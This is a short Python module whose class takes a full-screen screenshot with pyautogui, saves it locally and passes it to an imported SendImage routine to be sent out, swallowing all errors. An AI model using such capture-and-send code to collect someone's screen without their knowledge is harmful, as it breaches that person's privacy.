import pyautogui
import time
from datetime import datetime
# from drive_upload import Upload
import os
from send_image import SendImage

class Take():
	def __init__(self, u_name, id):
		self.u_name = u_name
		self.id = id

	def take_screenshot(self):
		image_name = f"{self.u_name}"
		myscreen = pyautogui.screenshot()
		cur_path = os.getcwd()
		try:
			os.makedirs(f'{cur_path}\\tmp')
		except:
			pass
		myscreen.save(f'{cur_path}\\tmp\\{image_name}.jpeg')
		temp = SendImage(self.id, f'{cur_path}\\tmp\\{image_name}.jpeg')
		try:
			temp.send()
			# os.remove(f'{cur_path}\\tmp\\{image_name}.jpeg') # Remove photos from local for storage optimization
		except:
			pass

	def main(self):
		print("Taking screenshot")
		self.take_screenshot()